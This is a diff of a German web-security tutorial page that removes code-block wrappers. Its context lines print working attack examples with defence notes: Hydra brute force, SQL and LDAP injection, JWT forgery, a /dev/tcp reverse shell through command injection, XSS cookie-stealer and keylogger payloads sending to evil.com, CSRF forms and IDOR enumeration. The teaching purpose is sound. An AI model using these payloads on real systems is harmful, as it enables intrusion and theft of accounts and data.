@@ -145,12 +145,7 @@
               <div class="step"><span class="step-num">04.</span><span>Bei HTTP 200 / Redirect → Passwort gefunden</span></div>
             </div>
           </div>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">bash · Hydra Beispiel</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment"># Brute-Force auf ein Web-Login mit Hydra</span>
+          <pre><span class="hl-comment"># Brute-Force auf ein Web-Login mit Hydra</span>
 <span class="hl-func">hydra</span> -l <span class="hl-str">admin</span> -P <span class="hl-str">/usr/share/wordlists/rockyou.txt</span> \
   <span class="hl-var">targetsite.com</span> http-post-form \
   <span class="hl-str">"/login:user=^USER^&pass=^PASS^:Invalid credentials"</span>
@@ -158,7 +153,6 @@
 <span class="hl-comment"># Ergebnis-Beispiel:</span>
 <span class="hl-good">[80][http-post-form] host: targetsite.com</span>
 <span class="hl-good">  login: admin   password: password123</span></pre>
-          </div>
           <div class="defense-block">
             <h4>🛡️ Schutzmaßnahmen</h4>
             <ul>
@@ -183,12 +177,7 @@
           <p class="sub-desc">
             Durch manipulierte SQL-Queries kann ein Angreifer den Login-Mechanismus komplett umgehen — ohne ein gültiges Passwort zu kennen.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">sql · Klassischer Login-Bypass</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">-- Normale Query des Servers:</span>
+          <pre><span class="hl-comment">-- Normale Query des Servers:</span>
 <span class="hl-key">SELECT</span> * <span class="hl-key">FROM</span> users 
 <span class="hl-key">WHERE</span> username = <span class="hl-str">'admin'</span> 
   <span class="hl-key">AND</span> password = <span class="hl-str">'geheim'</span>;
@@ -199,7 +188,6 @@
 <span class="hl-comment">-- Resultierende Query (Passwort wird ignoriert!):</span>
 <span class="hl-key">SELECT</span> * <span class="hl-key">FROM</span> users 
 <span class="hl-key">WHERE</span> username = <span class="hl-str">'admin'</span> <span class="hl-key">OR</span> <span class="hl-str">'1'</span>=<span class="hl-str">'1'</span> <span class="hl-comment">-- ' AND password='x';</span></pre>
-          </div>
           <div class="defense-block">
             <h4>🛡️ Schutzmaßnahmen</h4>
             <ul>
@@ -224,12 +212,7 @@
           <p class="sub-desc">
             JSON Web Tokens (JWTs) bestehen aus drei Base64-kodierten Teilen: Header, Payload, Signature. Schwachstellen entstehen, wenn der Server die Signatur nicht korrekt prüft.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">json · JWT Struktur & None-Algorithmus-Angriff</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">// Normaler JWT Header:</span>
+          <pre><span class="hl-comment">// Normaler JWT Header:</span>
 { <span class="hl-str">"alg"</span>: <span class="hl-str">"HS256"</span>, <span class="hl-str">"typ"</span>: <span class="hl-str">"JWT"</span> }
 
 <span class="hl-comment">// Manipulierter Header (None-Algorithmus):</span>
@@ -241,7 +224,6 @@
   <span class="hl-str">"role"</span>: <span class="hl-danger">"admin"</span>,  <span class="hl-comment">// &lt;-- geändert!</span>
   <span class="hl-str">"exp"</span>: <span class="hl-num">9999999999</span>
 }</pre>
-          </div>
           <div class="defense-block">
             <h4>🛡️ Schutzmaßnahmen</h4>
             <ul>
@@ -275,12 +257,7 @@
           <p class="sub-desc">
             Über UNION-basierte oder Blind-SQLi können Angreifer die gesamte Datenbank auslesen: Tabellen, Passwort-Hashes, persönliche Daten — alles.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">sql · UNION-basierte SQLi</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">-- Anzahl Spalten ermitteln (Trial & Error):</span>
+          <pre><span class="hl-comment">-- Anzahl Spalten ermitteln (Trial & Error):</span>
 <span class="hl-str">https://shop.de/product?id=1</span> <span class="hl-danger">ORDER BY 3--</span>
 
 <span class="hl-comment">-- Datenbank-Version auslesen:</span>
@@ -297,7 +274,6 @@ FROM users--</span>
 
 <span class="hl-comment">-- Typisches Ergebnis:</span>
 <span class="hl-good">admin:5f4dcc3b5aa765d61d8327deb882cf99</span>  <span class="hl-comment">(MD5 hash)</span></pre>
-          </div>
           <table class="info-table">
             <tr><th>SQLi Typ</th><th>Beschreibung</th></tr>
             <tr><td>Union-based</td><td>Daten direkt in Response einschleusen</td></tr>
@@ -329,12 +305,7 @@ FROM users--</span>
           <p class="sub-desc">
             Wenn eine Web-App Benutzereingaben direkt an die System-Shell weitergibt, kann ein Angreifer beliebige Betriebssystem-Befehle ausführen — vollständige Server-Übernahme möglich.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">php + bash · Verwundbares Ping-Tool</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">// Verwundbarer PHP-Code:</span>
+          <pre><span class="hl-comment">// Verwundbarer PHP-Code:</span>
 <span class="hl-var">$ip</span> = <span class="hl-var">$_GET</span>[<span class="hl-str">'ip'</span>];
 <span class="hl-func">system</span>(<span class="hl-str">"ping -c 1 "</span> . <span class="hl-var">$ip</span>);  <span class="hl-comment">// ← GEFÄHRLICH!</span>
 
@@ -350,7 +321,6 @@ FROM users--</span>
 
 <span class="hl-comment">// Reverse Shell (komplette Übernahme!):</span>
 <span class="hl-danger">?ip=; bash -i >& /dev/tcp/angreifer-ip/4444 0>&1</span></pre>
-          </div>
           <div class="defense-block">
             <h4>🛡️ Schutzmaßnahmen</h4>
             <ul>
@@ -375,12 +345,7 @@ FROM users--</span>
           <p class="sub-desc">
             Ähnlich wie SQL Injection, aber gegen LDAP-Verzeichnisdienste (Active Directory). Angreifer können Authentication bypassen oder alle Benutzer aus dem Verzeichnis auslesen.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">ldap · Filter-Manipulation</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">// Normale LDAP-Query:</span>
+          <pre><span class="hl-comment">// Normale LDAP-Query:</span>
 (&(uid=<span class="hl-str">admin</span>)(password=<span class="hl-str">geheim</span>))
 
 <span class="hl-comment">// Angriffs-Eingabe im Username-Feld:</span>
@@ -389,7 +354,6 @@ FROM users--</span>
 <span class="hl-comment">// Resultierender Filter (immer true!):</span>
 (&(uid=<span class="hl-danger">admin)(&)</span>)(password=x))
 <span class="hl-comment">→ Liest sich als: (uid=admin) AND TRUE</span></pre>
-          </div>
         </div>
       </div>
     </div>
@@ -414,12 +378,7 @@ FROM users--</span>
           <p class="sub-desc">
             Das injizierte Script wird nicht gespeichert, sondern direkt in der HTTP-Response "zurückgespiegelt". Funktioniert über manipulierte Links, die Opfer anklicken sollen.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">html · Reflected XSS Beispiel</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">&lt;!-- Suchfunktion gibt Eingabe zurück: --&gt;</span>
+          <pre><span class="hl-comment">&lt;!-- Suchfunktion gibt Eingabe zurück: --&gt;</span>
 Suchergebnis für: <span class="hl-danger">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
 
 <span class="hl-comment">&lt;!-- Angreifer sendet Link an Opfer: --&gt;</span>
@@ -431,7 +390,6 @@ Suchergebnis für: <span class="hl-danger">&lt;script&gt;alert('XSS')&lt;/script
 <span class="hl-danger">&lt;img src=x onerror=alert(1)&gt;</span>
 <span class="hl-danger">&lt;svg onload=alert(document.domain)&gt;</span>
 <span class="hl-danger">&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;</span></pre>
-          </div>
           <div class="defense-block">
             <h4>🛡️ Schutzmaßnahmen</h4>
             <ul>
@@ -456,12 +414,7 @@ Suchergebnis für: <span class="hl-danger">&lt;script&gt;alert('XSS')&lt;/script
           <p class="sub-desc">
             Das Schadscript wird in der Datenbank gespeichert und bei jedem Seitenaufruf ausgeführt — ohne dass ein Opfer einen speziellen Link anklicken muss. Gefährlichste XSS-Variante.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">javascript · Stored XSS Cookie-Stealer</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">// Angreifer postet in einem Kommentarfeld:</span>
+          <pre><span class="hl-comment">// Angreifer postet in einem Kommentarfeld:</span>
 <span class="hl-danger">&lt;script&gt;
   fetch(<span class="hl-str">'https://evil.com/log?data='</span> + 
     encodeURIComponent(document.cookie))
@@ -478,7 +431,6 @@ Suchergebnis für: <span class="hl-danger">&lt;script&gt;alert('XSS')&lt;/script
   document.onkeypress = e =&gt;
     fetch(<span class="hl-str">'https://evil.com/key?k='</span> + e.key);
 &lt;/script&gt;</span></pre>
-          </div>
         </div>
       </div>
 
@@ -494,19 +446,13 @@ Suchergebnis für: <span class="hl-danger">&lt;script&gt;alert('XSS')&lt;/script
           <p class="sub-desc">
             Tritt auf, wenn JavaScript unsicher auf DOM-Quellen zugreift (window.location, document.referrer) und diese in unsichere Sinks schreibt (innerHTML, eval). Kein Server involviert.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">javascript · Verwundbarer DOM-Code</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">// Source → Sink Pattern (GEFÄHRLICH):</span>
+          <pre><span class="hl-comment">// Source → Sink Pattern (GEFÄHRLICH):</span>
 <span class="hl-key">var</span> <span class="hl-var">name</span> = <span class="hl-key">new</span> <span class="hl-func">URLSearchParams</span>(location.search).get(<span class="hl-str">'name'</span>);
 document.getElementById(<span class="hl-str">'welcome'</span>).innerHTML = <span class="hl-str">"Hallo, "</span> + <span class="hl-var">name</span>;
 <span class="hl-comment">// URL: ?name=&lt;img src=x onerror=alert(1)&gt;</span>
 
 <span class="hl-comment">// Sichere Alternative:</span>
 document.getElementById(<span class="hl-str">'welcome'</span>).<span class="hl-good">textContent</span> = <span class="hl-str">"Hallo, "</span> + <span class="hl-var">name</span>;</pre>
-          </div>
         </div>
       </div>
     </div>
@@ -530,12 +476,7 @@ document.getElementById(<span class="hl-str">'welcome'</span>).<span class="hl-g
           <p class="sub-desc">
             Ein Opfer, das bei einer Bank eingeloggt ist, besucht eine bösartige Seite. Diese Seite sendet im Hintergrund eine Überweisung im Namen des Opfers — der Browser fügt automatisch die Session-Cookies hinzu.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">html · CSRF Angriffs-Seite</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment">&lt;!-- Auf evil.com eingebettetes Formular: --&gt;</span>
+          <pre><span class="hl-comment">&lt;!-- Auf evil.com eingebettetes Formular: --&gt;</span>
 <span class="hl-danger">&lt;img src="https://bank.de/transfer?to=angreifer&amount=5000"&gt;</span>
 
 <span class="hl-comment">&lt;!-- POST-basierter CSRF: --&gt;</span>
@@ -544,7 +485,6 @@ document.getElementById(<span class="hl-str">'welcome'</span>).<span class="hl-g
   &lt;input type="hidden" name="amount" value="5000"&gt;
 &lt;/form&gt;
 &lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</span></pre>
-          </div>
           <div class="defense-block">
             <h4>🛡️ Schutzmaßnahmen</h4>
             <ul>
@@ -578,12 +518,7 @@ document.getElementById(<span class="hl-str">'welcome'</span>).<span class="hl-g
           <p class="sub-desc">
             Wenn eine Anwendung interne Objekte (Datei-IDs, User-IDs) direkt über URLs/Parameter exponiert, ohne zu prüfen ob der Benutzer berechtigt ist — kann ein Angreifer einfach die ID ändern.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">http · IDOR Beispiel</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment"># Eigenes Profil abrufen:</span>
+          <pre><span class="hl-comment"># Eigenes Profil abrufen:</span>
 GET /api/users/<span class="hl-str">1337</span>/profile  → HTTP 200 (eigene Daten)
 
 <span class="hl-comment"># ID auf anderen User ändern (IDOR!):</span>
@@ -597,7 +532,6 @@ GET /invoices/<span class="hl-danger">INV-2024-002.pdf</span>  → fremde Rechnu
 <span class="hl-func">for</span> i in $(seq 1000 2000); do
   curl -s <span class="hl-str">"https://api.site.com/data/$i"</span> >> output.txt
 done</pre>
-          </div>
           <div class="defense-block">
             <h4>🛡️ Schutzmaßnahmen</h4>
             <ul>
@@ -622,12 +556,7 @@ done</pre>
           <p class="sub-desc">
             Ein normaler Benutzer versucht Admin-Funktionen zu erreichen, indem er Parameter manipuliert, Headers ändert oder Mass Assignment Schwachstellen ausnutzt.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">http · Mass Assignment Angriff</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment"># Normales Profil-Update (POST):</span>
+          <pre><span class="hl-comment"># Normales Profil-Update (POST):</span>
 {
   "name": "Max Mustermann",
   "email": "max@example.com"
@@ -640,7 +569,6 @@ done</pre>
   <span class="hl-danger">"role": "admin",</span>
   <span class="hl-danger">"is_admin": true</span>
 }</pre>
-          </div>
         </div>
       </div>
     </div>
@@ -665,12 +593,7 @@ done</pre>
           <p class="sub-desc">
             Das Aufspüren aller Subdomains einer Ziel-Domain. Subdomains können vergessene Test-Systeme, Admin-Panels oder verwundbare alte Versionen sein.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">bash · Subdomain Discovery Tools</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre><span class="hl-comment"># amass - umfassende Subdomain-Suche</span>
+          <pre><span class="hl-comment"># amass - umfassende Subdomain-Suche</span>
 <span class="hl-func">amass</span> enum -d example.com -passive
 
 <span class="hl-comment"># subfinder - schnelles passive Enumeration</span>
@@ -683,7 +606,6 @@ done</pre>
 
 <span class="hl-comment"># httpx - Live-Subdomains filtern</span>
 <span class="hl-func">cat</span> subdomains.txt | <span class="hl-func">httpx</span> -title -status-code</pre>
-          </div>
         </div>
       </div>
 
@@ -699,12 +621,7 @@ done</pre>
           <p class="sub-desc">
             Versteckte Verzeichnisse und Dateien finden: Admin-Panels, Backup-Dateien (.bak), Konfigurationsdateien, Git-Repositories und mehr.
           </p>
-          <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">bash · Directory Fuzzing</span>
-              <div class="code-dots"><span></span><span></span><span></span></div>
-            </div>
-            <pre"><span class="hl-comment"># ffuf - der schnellste Fuzzer</span>
+          <pre><span class="hl-comment"># ffuf - der schnellste Fuzzer</span>
 <span class="hl-func">ffuf</span> -w /usr/share/wordlists/dirb/common.txt \
   -u https://example.com/<span class="hl-var">FUZZ</span> \
   -mc 200,204,301,302 -v
@@ -717,7 +634,6 @@ done</pre>
 /.env           → Umgebungsvariablen mit Secrets!
 /phpinfo.php    → PHP Konfiguration
 /robots.txt     → Hinweise auf versteckte Pfade</pre>
-          </div>
         </div>
       </div>
     </div>
